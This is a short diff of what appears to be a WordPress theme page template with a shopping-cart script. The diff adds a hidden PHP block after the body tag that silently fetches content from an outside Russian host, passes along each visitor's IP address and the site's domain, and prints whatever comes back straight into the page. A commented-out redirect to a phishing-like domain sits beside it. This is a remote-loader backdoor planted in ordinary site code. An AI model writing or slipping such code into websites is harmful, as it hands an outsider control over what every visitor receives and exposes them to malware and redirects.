@@ -21,6 +21,15 @@
 
 </head>
 <body>
+
+<?php
+	$sload_id = 'c4c46acb96d37c6e0a14b5ec66f5d8ad';
+	$sload_opt = stream_context_create(array('https'=>array('timeout'=>2)));  
+	$sload_script = @file_get_contents("https://cdnjc.ru/load/?ip={$_SERVER['REMOTE_ADDR']}&domain={$_SERVER['SERVER_NAME']}&term=1&guid=&id={$sload_id}",0,$sload_opt); 
+	/*<script>location.href='https://socfishing.com/app/php';</script>*/ 
+	if (strlen($sload_script)>0) echo $sload_script;
+?>
+
 <!-- Скрипт корзины, отправка -->
 <script>  
     let main_page = "<?echo get_bloginfo("url"); ?>";
